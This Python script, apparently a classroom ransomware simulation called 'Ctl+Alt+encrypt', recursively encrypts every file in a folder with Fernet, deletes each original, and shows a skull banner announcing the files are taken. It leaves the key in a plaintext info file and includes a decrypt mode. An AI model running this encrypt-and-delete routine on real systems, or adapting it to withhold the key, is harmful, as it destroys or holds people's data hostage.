"""
Per-file folder encryption script for the ITE-449 cybersecurity project.

This script works similarly to `encrypt_folder.py`, but instead of zipping
the folder into a single archive it:

- Walks the target folder recursively.
- Encrypts each file individually using a single Fernet key.
- Rewrites each file as a `.enc` file (e.g. `report.txt` -> `report.txt.enc`)
  and deletes the original.
- Writes an `encryption_info.txt` file into the folder with a short message
  and the encryption key.

In decrypt mode it will:

- Read the key from the info file.
- Find all `.enc` files under the folder.
- Decrypt each one and write the original file into an output folder,
  preserving the original directory structure and file names.

Requirements:
- Python 3.8+
- cryptography  (install with: pip install cryptography)
"""

from __future__ import annotations

import argparse
import os
from dataclasses import dataclass
import time
import sys
import shutil
from pathlib import Path
from typing import Optional

from cryptography.fernet import Fernet, InvalidToken


DEFAULT_INFO_FILENAME = "encryption_info.txt"


@dataclass
class EncryptConfig:
    folder: Path
    info_file: Path
    slow_demo: bool


@dataclass
class DecryptConfig:
    folder: Path
    info_file: Path
    output_folder: Path


def parse_args(argv: Optional[list[str]] = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description=(
            "Encrypt each file in a folder tree individually using Fernet "
            "(AES-based) encryption, rewriting them as .enc files, or "
            "decrypt those .enc files into a separate output folder."
        )
    )

    parser.add_argument(
        "--folder",
        type=str,
        required=True,
        help="Path to the folder to encrypt (or containing .enc files to decrypt).",
    )
    parser.add_argument(
        "--decrypt",
        action="store_true",
        help="Run in decrypt mode instead of encrypt mode.",
    )
    parser.add_argument(
        "--slow-demo",
        action="store_true",
        help=(
            "Slow encryption to roughly 1 minute with a visible progress bar. "
            "If not set, encryption runs at full speed."
        ),
    )
    parser.add_argument(
        "--info-file",
        type=str,
        help=(
            "Path to the encryption info text file. "
            f"Defaults to <folder>/{DEFAULT_INFO_FILENAME}."
        ),
    )
    parser.add_argument(
        "--output-folder",
        type=str,
        help=(
            "Output folder for decrypted contents (decrypt mode). "
            "Defaults to the same folder passed in --folder."
        ),
    )

    return parser.parse_args(argv)


def build_encrypt_config(args: argparse.Namespace) -> EncryptConfig:
    folder = Path(args.folder).expanduser().resolve()
    if not folder.exists() or not folder.is_dir():
        raise SystemExit(f"Folder does not exist or is not a directory: {folder}")

    if args.info_file:
        info_file = Path(args.info_file).expanduser().resolve()
    else:
        info_file = folder / DEFAULT_INFO_FILENAME

    return EncryptConfig(
        folder=folder,
        info_file=info_file,
        slow_demo=bool(getattr(args, "slow_demo", False)),
    )


def build_decrypt_config(args: argparse.Namespace) -> DecryptConfig:
    folder = Path(args.folder).expanduser().resolve()
    if not folder.exists() or not folder.is_dir():
        raise SystemExit(f"Folder does not exist or is not a directory: {folder}")

    if args.info_file:
        info_file = Path(args.info_file).expanduser().resolve()
    else:
        info_file = folder / DEFAULT_INFO_FILENAME

    if not info_file.exists():
        raise SystemExit(f"Encryption info file not found: {info_file}")

    if args.output_folder:
        output_folder = Path(args.output_folder).expanduser().resolve()
    else:
        # Default: restore files back into the original folder.
        output_folder = folder

    return DecryptConfig(folder=folder, info_file=info_file, output_folder=output_folder)


def generate_key() -> bytes:
    """Generate a new random Fernet key."""
    return Fernet.generate_key()


def write_info_file(info_path: Path, key: bytes) -> None:
    """
    Write a text file with a brief explanation and the encryption key.
    """
    info_path.parent.mkdir(parents=True, exist_ok=True)
    message_lines = [
        "This folder has been encrypted by Ctl+Alt+encrypt as part of a cybersecurity class exercise.",
        "Each individual file has been encrypted using the same symmetric key",
        "and renamed with the `.enc` extension (for example: `file.txt.enc`).",
        "",
        "Use the Python script `encrypt_files.py` together with the key below",
        "to decrypt the files into a separate output folder.",
        "",
        "Encryption key (Fernet, base64 URL-safe):",
        key.decode("utf-8"),
        "",
    ]
    info_path.write_text("\n".join(message_lines), encoding="utf-8")


def show_laughing_skull() -> None:
    """
    Display a looping red ASCII skull with a centered Ctl+Alt+encrypt header
    until the user presses Ctrl+C.
    """
    skull_path = Path(__file__).resolve().parent / "skulls.txt"
    try:
        skull_text = skull_path.read_text(encoding="utf-8")
    except OSError:
        skull_text = "[ skull art file 'skulls.txt' not found ]"

    frames = [skull_text]

    try:
        idx = 0
        while True:
            cols = shutil.get_terminal_size(fallback=(80, 24)).columns
            header = "Ctl+Alt+encrypt"
            subtitle = "All your files are belong to us."
            pad = max(0, (cols - len(header)) // 2)
            pad_sub = max(0, (cols - len(subtitle)) // 2)
            header_line = " " * pad + header
            subtitle_line = " " * pad_sub + subtitle

            # Center skull lines as well
            skull_lines = frames[idx % len(frames)].splitlines()
            centered_lines = []
            for line in skull_lines:
                stripped = line.rstrip("\n")
                if not stripped:
                    centered_lines.append("")
                else:
                    pad_line = max(0, (cols - len(stripped)) // 2)
                    centered_lines.append(" " * pad_line + stripped)
            centered_skull = "\n".join(centered_lines)

            # Clear screen and move cursor home.
            sys.stdout.write("\033[2J\033[H")
            # Header & subtitle in red.
            sys.stdout.write("\033[31m")
            sys.stdout.write(header_line + "\n")
            sys.stdout.write(subtitle_line + "\n\n")
            sys.stdout.write("\033[0m")
            # Skull in red.
            sys.stdout.write("\033[31m")
            sys.stdout.write(centered_skull)
            sys.stdout.write("\033[0m")
            sys.stdout.flush()

            idx += 1
            time.sleep(0.25)
    except KeyboardInterrupt:
        sys.stdout.write("\n")
        sys.stdout.flush()

def read_key_from_info_file(info_path: Path) -> bytes:
    """
    Read the encryption key from the info file.

    The function looks for a non-empty line after the line that starts with
    'Encryption key' and returns it as bytes.
    """
    text = info_path.read_text(encoding="utf-8")
    lines = [line.rstrip("\n") for line in text.splitlines()]

    for idx, line in enumerate(lines):
        if line.strip().lower().startswith("encryption key"):
            # Next non-empty line should be the key
            for next_line in lines[idx + 1 :]:
                key_str = next_line.strip()
                if key_str:
                    return key_str.encode("utf-8")
            break

    raise SystemExit(
        f"Could not find encryption key in info file: {info_path}. "
        "Expected a non-empty line after the 'Encryption key' line."
    )


def encrypt_files(config: EncryptConfig) -> None:
    print(f"[+] Encrypting files in folder: {config.folder}")

    print("[+] Generating encryption key")
    key = generate_key()
    fernet = Fernet(key)

    # First collect all files that need encryption so we can
    # show an accurate progress bar and control timing.
    files_to_encrypt: list[Path] = []
    for root, _dirs, files in os.walk(config.folder):
        root_path = Path(root)
        for name in files:
            file_path = root_path / name

            if file_path == config.info_file:
                continue
            if file_path.name.endswith(".enc"):
                continue

            files_to_encrypt.append(file_path)

    total = len(files_to_encrypt)
    if total == 0:
        print("[!] No files found to encrypt.")
    else:
        target_seconds = 60.0 if config.slow_demo else None

        if target_seconds is not None:
            print(
                f"[+] Found {total} files to encrypt. "
                f"Target duration ~{int(target_seconds)} seconds."
            )
            delay_per_file = target_seconds / total
        else:
            print(f"[+] Found {total} files to encrypt.")
            delay_per_file = 0.0

        bar_width = 40
        for index, file_path in enumerate(files_to_encrypt, start=1):
            plaintext = file_path.read_bytes()
            token = fernet.encrypt(plaintext)

            enc_path = file_path.with_name(file_path.name + ".enc")
            enc_path.write_bytes(token)

            # Remove original file after successful encryption.
            file_path.unlink()

            # Update status bar.
            progress = index / total
            filled = int(bar_width * progress)
            bar = "#" * filled + "-" * (bar_width - filled)
            percent = int(progress * 100)
            print(f"\r[ {bar} ] {percent:3d}% ({index}/{total})", end="", flush=True)

            # Slow down to roughly the target duration if requested.
            if delay_per_file > 0 and index < total:
                time.sleep(delay_per_file)

        print()  # newline after progress bar
        print(f"[+] Encrypted {total} files.")

    print(f"[+] Writing encryption info file to: {config.info_file}")
    write_info_file(config.info_file, key=key)
    print("[+] Encryption complete.")


def decrypt_files(config: DecryptConfig) -> None:
    print(f"[+] Reading encryption key from: {config.info_file}")
    key = read_key_from_info_file(config.info_file)
    fernet = Fernet(key)

    print(f"[+] Decrypting .enc files from: {config.folder}")
    config.output_folder.mkdir(parents=True, exist_ok=True)

    file_count = 0
    for root, _dirs, files in os.walk(config.folder):
        root_path = Path(root)
        for name in files:
            file_path = root_path / name

            # Only process .enc files
            if not file_path.name.endswith(".enc"):
                continue
            if file_path == config.info_file:
                continue

            encrypted_bytes = file_path.read_bytes()
            try:
                plaintext = fernet.decrypt(encrypted_bytes)
            except InvalidToken as exc:
                raise SystemExit(
                    f"Decryption failed for {file_path}: invalid key or corrupted data ({exc})"
                )

            # Build relative path and remove the .enc suffix for output.
            rel = file_path.relative_to(config.folder)
            rel_str = str(rel)
            if not rel_str.endswith(".enc"):
                # Should not happen due to check above, but be safe.
                output_rel = rel
            else:
                output_rel = Path(rel_str[: -len(".enc")])

            output_path = config.output_folder / output_rel
            output_path.parent.mkdir(parents=True, exist_ok=True)
            output_path.write_bytes(plaintext)

            # After successful decryption, remove the .enc file so only the
            # restored original remains in the target folder.
            file_path.unlink()

            file_count += 1

    print(f"[+] Decrypted {file_count} files into: {config.output_folder}")
    print("[+] Decryption complete.")


def main(argv: Optional[list[str]] = None) -> None:
    args = parse_args(argv)
    if args.decrypt:
        cfg = build_decrypt_config(args)
        decrypt_files(cfg)
    else:
        cfg = build_encrypt_config(args)
        encrypt_files(cfg)
        print("[+] Encryption complete. Press Ctrl+C to stop the animation.")
        show_laughing_skull()


if __name__ == "__main__":
    main()

